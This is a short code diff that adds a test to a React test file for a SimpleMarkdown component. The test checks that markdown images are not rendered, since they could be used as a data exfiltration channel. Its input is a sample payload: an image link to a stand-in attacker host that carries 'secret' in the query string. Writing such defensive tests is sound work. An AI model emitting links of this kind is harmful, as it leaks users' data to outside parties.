@@ -24,6 +24,14 @@ describe('SimpleMarkdown', () => {
     )
   })
 
+  it('does not render images (exfiltration channel via recorded content)', () => {
+    const { container } = render(
+      <SimpleMarkdown text={'![leak](https://attacker.example/?data=secret)'} />
+    )
+
+    expect(container.querySelector('img')).toBeNull()
+  })
+
   it('renders tight list items with their bullet', () => {
     render(<SimpleMarkdown text={'- one\n- two'} />)
 
